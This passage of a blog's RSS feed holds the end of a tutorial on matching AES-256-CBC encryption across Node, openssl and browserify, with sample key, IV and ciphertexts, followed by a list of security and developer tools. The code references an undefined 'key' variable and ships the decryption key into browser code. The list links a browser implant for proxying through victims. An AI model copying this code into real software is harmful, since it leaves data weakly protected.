  const salt = crypto.randomBytes(128 / 8).toString("hex");
  //here we generate the key and give it back as a string, we use 100k iterations
  //as suggested in best practices
  //We can use the key multiple times to encrypt multiple things(-30GB), we just cant use
  //the same initialization vector twice
  //the key for aes-256 needs to be 256 bits which equals 32 bytes or 32 characters it is currently of type Buffer
  const configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, "sha256");
  //create unique IV for each encryption, the key can be reused. IV needs to always be 16 bytes. it is currently of type buffer
  const IV = crypto.randomBytes(16);

  //create ciphers for each encryption using the shared key and the unuique IV
  const projectConfigCipher = crypto.createCipheriv(
    "aes-256-cbc",
    configKey,
    IV
  );
  //when using hex strings as IV/keys you can convert it into a buffer to make it work:
  //Buffer.from('1d6ef201e0e7a9019ddf8414034325e2','hex')

  //encrypting the storage location using the prepared cipher
  // our input is an object, so we first stringify it and set the input encoding to utf8, for our output we need base64 encoding
  let encrypted = projectConfigCipher.update(
    JSON.stringify(data),
    "utf8",
    "base64"
  );
  // finalize the encryption also with base64 output encoding
  encrypted += projectConfigCipher.final("base64");

  /***************************************************************
   * To be able to decrypt later, we need to save the IV and key somewhere.
   * it is recommended to store the iv together with the encrypted
   * data, but you should store the key separately. we save those values
   *  as hex-encoded strings - so the can later be converted into binary again
   ****************************************************************/
  const saveKey = key.toString("hex");
  const saveIV = IV.toString("hex");
  // the above strings can be directly interpreted by openssl
  // the above key can be converted to a buffer in node: Buffer.from(saveKey, 'hex')
  // the above key can be converted to binary using hexToBin() in the browser

  return encrypted;
};
</code></pre>
<ul>
<li><strong><code>OUTPUT_DATA</code></strong> = Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUSgCV12rE4RpgPdjXMJJB2vNJZ+00LvE9nkn77fW0pf8c/tzW5MxQpzqV3A+HvniM= <code>//look what a nice base64 string</code></li>
<li><strong><code>OUTPUT_KEY</code></strong> = '5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9'</li>
<li><strong><code>OUTPUT_IV</code></strong> = '1d6ef201e0e7a9019ddf8414034325e2'</li>
</ul>
<p>Our output data looks good, so lets test what openssl can do with it!</p>
<h2 id="usingnodecryptosoutputasinputinopenssl">Using Node.crypto's output as input in openssl</h2>
<p>from node, we get the data shown above as files named <em>key</em> and <em>iv</em>
In my use case we only need the <code>key</code> and <code>IV</code> to encrypt a new config. I still did include a decryption example as well here.</p>
<p>Things to keep in mind:</p>
<ul>
<li>output encoding must be base64</li>
<li><code>-nosalt</code> option needs to be enabled</li>
<li><code>-A</code> option needs to be enabled</li>
</ul>
<pre><code class="bash language-bash">#########################################################################################
#                                                                                       #
#               ENCRYPTION FOR CLI IN / MACOS / LINUX / WINDOWS                         #
#                                                                                       #
#########################################################################################

#encrypt with key &amp; IV but no salt
#config.json contains the testdata defined above
cat config.json | openssl aes-256-cbc -iv $(cat iv)  -K $(cat key) -A -nosalt -base64

#decrypt with key IV and base64
# we use the output base64 string from node here
echo "Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUSgCV12rE4RpgPdjXMJJB2vNJZ+00LvE9nkn77fW0pf8c/tzW5MxQpzqV3A+HvniM=" | openssl aes-256-cbc -d -iv $(cat iv)  -K $(cat key) -base64 -A
</code></pre>
<h3 id="encryptionoutput">Encryption output:</h3>
<ul>
<li><strong><code>OUTPUT_encrypt</code></strong> = Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg= <code>//looking good..</code></li>
</ul>
<h3 id="decryptionoutput">Decryption output:</h3>
<ul>
<li><strong><code>OUTPUT_decrypt</code></strong> = {"TestData":"w17h Spé^cIäl chàær§¢tèrs","OK":"://seems/fine?x=lol"} <code>//nice, thats our original data!</code></li>
</ul>
<p>Since our Output looks good and even the decryption worked fine, lets test what our browserify implementation can do with this.</p>
<h2 id="usingbrowserifytodecryptnodeoropensslinput">Using browserify to decrypt node or openssl input</h2>
<p>This code expects the following input:</p>
<ul>
<li>base64 encoded string to decrypt</li>
<li>iv in the form of a hex-encoded string</li>
<li>key in the form of a hex-encoded string</li>
</ul>
<p>I get the keys from process.env in this example. You could also receive them via input or even a file.</p>
<p>This code needs to be able to produce consistent output when receiving input from either node or openssl.</p>
<p>We had to create a custom function <code>hexToBin()</code> to convert a hex string into a binary array to be consumed by our cipher.</p>
<pre><code class="js language-js">import crypto from "browserify-aes";

/**********************************************************************
 *
 *        DECRYPTION MODULE FOR USE IN BROWSER DURING RUNTIME          *
 *
 ***********************************************************************/
const decrypt = (Base64Hash) =&gt; {
  const Key = process.env.APP_KEY; //hex encoded string
  const IV = process.env.APP_IV; //hex encoded string

  const hexToBin = (hex) =&gt; {
    //converts hex strings to binary arr
    for (var bytes = [], c = 0; c &lt; hex.length; c += 2) {
      bytes.push(parseInt(hex.substr(c, 2), 16));
    }
    return bytes;
  };

  //ein neuer cipher wird vorbereitet, mittels aes256, unserem 256 bit KEY und dem config IV
  const decipher = crypto.createDecipheriv(
    "aes256",
    hexToBin(Key),
    hexToBin(IV)
  );

  //der hash wird nun decrypted mittels dem zuvor erstellten cipher
  const decrypted = Buffer.concat([
    decipher.update(Buffer.from(Base64Hash, "base64")),
    decipher.final(),
  ]).toString("utf8");

  return JSON.parse(decrypted);
};
</code></pre>
<ul>
<li><strong><code>OUTPUT_openssl</code></strong> = {TestData: "w17h Spé^cIäl chàær§¢tèrs", OK: "://seems/fine?x=lol"} <code>//yes, thats our original input! :D</code></li>
<li><strong><code>OUTPUT_nodejs</code></strong> = {TestData: "w17h Spé^cIäl chàær§¢tèrs", OK: "://seems/fine?x=lol"} <code>//and we even handled the node version! sick!</code></li>
</ul>
<p>That's it! We did it yay!</p>
<blockquote>
  <p>Feel free to comment and discuss on my gist: <a href="https://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a">This project on gist</a></p>
</blockquote>]]></description><link>https://dev.lwlx.xyz/blog/blog/consistent-x-device-encryption-in-javascript</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/consistent-x-device-encryption-in-javascript</guid><category><![CDATA[encryption]]></category><category><![CDATA[decryption]]></category><category><![CDATA[openssl]]></category><category><![CDATA[nodejs]]></category><category><![CDATA[php]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Thu, 29 Oct 2020 10:26:43 GMT</pubDate></item><item><title><![CDATA[A Collection of useful Security and DevOps tools.]]></title><description><![CDATA[<h1 id="sicktools">sickTools</h1>
<p>a collection of useful, special, or just cool tools to use and try to get more done in less time.</p>
<hr />
<h2 id="appsectools">AppSec Tools</h2>
<ul>
<li>[x] <a href="https://github.com/CISOfy/lynis">lynis</a> | <code>active</code> |: Security auditing tool for Linux, macOS, and UNIX-based systems</li>
<li>[ ] <a href="https://github.com/nomasters/killcord">killcord</a> | <strong><code>new</code></strong> |: a censorship resistant deadman's switch</li>
<li>[x] <a href="https://github.com/zaproxy/zaproxy">OWASP ZAP</a> | <code>active</code> |: autodetect security vulnerabilities in your web applications while developing and testing your applications</li>
<li>[ ] <a href="https://github.com/Cisco-Talos/clamav-faq">ClamAV</a> | <strong><code>new</code></strong> |: open source antivirus engine for detecting trojans, viruses, malware &amp; other malicious threats.</li>
<li>[ ] <a href="https://github.com/skeeto/endlessh">endlessh</a> | <strong><code>new</code></strong> |: Endlessh is an SSH tarpit (honeypot) that very slowly sends an endless, random SSH banner</li>
</ul>
<hr />
<h2 id="automationtools">Automation Tools</h2>
<ul>
<li>[ ]</li>
</ul>
<hr />
<h2 id="developertools">developer Tools</h2>
<ul>
<li>[x] <a href="https://github.com/ipfs/js-ipfs">(js-) IPFS</a> | <code>active</code> |: A peer-to-peer hypermedia protocol
  designed to make the web faster, safer, and more open.</li>
<li>[ ] <a href="https://github.com/ml5js/ml5-library">ML5.js</a> | <em>tested</em> |: Friendly &amp; easy to use machine learning for the web!</li>
<li>[ ] <a href="https://github.com/tensorflow">TensorFlow</a> | <strong><code>new</code></strong> |: Open Source Machine Learning Framework (With extensive docs and big community)</li>
<li>[ ] <a href="https://github.com/denoland/deno">deno</a> | <em>testing</em> |: Deno aims to provide a productive and secure scripting environment for the modern programmer. It is built on top of V8, Rust, and TypeScript.</li>
<li>[x] <a href="https://github.com/pnpm/pnpm">PNPM</a> | <em>testing</em> |: Faster, disk space efficient package manager, with good monorepo support.</li>
<li>[ ] <a href="https://verdaccio.org/">verdaccio</a> | <strong><code>new</code></strong> |: A lightweight open source private npm proxy registry</li>
<li>[ ] <a href="https://github.com/caprover/caprover">caprover</a> | <strong><code>new</code></strong> |: Easiest app/database deployment platform and webserver package for your NodeJS, Python, PHP, Ruby, Go applications. No Docker, nginx knowledge required!</li>
</ul>
<hr />
<h2 id="misctools">misc Tools</h2>
<ul>
<li>[x] <a href="https://thehackerblog.com/galvanizer/">Chrome Galvanizer</a> | <em>tested</em> |: Harden your Chrome browser via enterprise policy.</li>
<li>[ ] <a href="https://github.com/mandatoryprogrammer/CursedChrome">Cursed Chrome</a> | <strong><code>new</code></strong> |: Chrome-extension implant that turns victim Chrome browsers into fully-functional HTTP proxies, allowing you to browse sites as your victims.</li>
<li>[x] <a href="https://github.com/nmap/nmap">NMAP</a> | <code>active</code> |: The #1 network scanner &amp; mapper</li>
<li>[x] <a href="https://github.com/vulnersCom/nmap-vulners">nmap-vulners</a> | <code>active</code> |: extension to NMAP that chekcs for more known vulns</li>
<li>[ ] <a href="https://github.com/lesspass/lesspass">lesspass</a> | <strong><code>new</code></strong> |: stateless open source password manager</li>
<li>[ ] <a href="https://grantproxy.com/">GrantProxy</a> | <strong><code>new</code></strong> |: Turn your web browser into a magic proxy server in one click.</li>
<li>[ ] <a href="https://github.com/ohmyzsh/ohmyzsh">ohmyzsh</a> | <strong><code>new</code></strong> |: A delightful community-driven framework for managing your zsh configuration. Includes 200+ plugins</li>
</ul>
<hr />
<h1 id="sickguides">sickGuides</h1>
<p>a collection of useful guides or tutorials to stay safe.</p>
<h2 id="securityguides">Security Guides</h2>
<ul>
<li>[x] <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheets</a> | <code>active</code> |: These cheat sheets were created by various application security professionals who have expertise in specific topics.</li>
<li>[ ] <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS CheatSheet</a> | <code>active</code> |: An extensive list of known XSS vulns, sortable and searchable</li>
</ul>
<hr />
<h2 id="devguides">Dev Guides</h2>
<ul>
<li>[ ] <a href="https://htmlhead.dev/">HTMLHEAD.dev</a> : A free guide to HTML5 <head> elements</li>
<li>[ ] <a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/">CSS FlexBox Cheatsheet</a> | <code>active</code> |: the only CSS flexbox cheatsheet you'll need</li>
<li>[x] <a href="https://devdocs.io/">DevDocs.io</a> | <code>active</code> |: Huge, fast, searchable reporsitory for dev documentation, from java to docker, from rust to WordPress.</li>
<li>[ ] <a href="https://blog.bitsrc.io/how-to-set-up-a-private-npm-registry-locally-1065e6790796">Set Up a Private NPM Registry Locally</a> | <em>tested</em> |: using verdaccio to setup local NPM registry.</li>
<li>[ ] <a href="https://www.codegrepper.com/index.php">Grepper</a> | <strong><code>new</code></strong> |: Accrue code answers to common coding problems, find code answers without thinking - using Greppers “code problem” search engine.</li>
</ul>
<hr />
<h3 id="sources">Sources</h3>
<ul>
<li><a href="https://owasp.org/"><code>OWASP</code></a> — The Open Source Web Application Security Protocol</li>
<li><a href="https://github.com/mandatoryprogrammer/"><code>Matthew Bryant</code></a> — XSSHunter / chrome galvanizer</li>
<li><a href="https://skills.rendered.ch"><code>lwlx</code></a> — lwlx</li>
</ul>
<h2 id="license">License</h2>
<p><a href="LICENSE">The MIT License</a>.</p>
<ul>
<li><code>- [ ] ([tool name](&lt;link&gt;)|*tested*|**</code>new<code>**|deprecated|</code>active<code>): &lt;description&gt;</code></li>
</ul>]]></description><link>https://dev.lwlx.xyz/blog/blog/Sick-Security-and-Dev-Tools</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/Sick-Security-and-Dev-Tools</guid><category><![CDATA[tools]]></category><category><![CDATA[devtools]]></category><category><![CDATA[security]]></category><category><![CDATA[javascript]]></category><category><![CDATA[devops]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Tue, 22 Sep 2020 14:48:08 GMT</pubDate></item></channel></rss>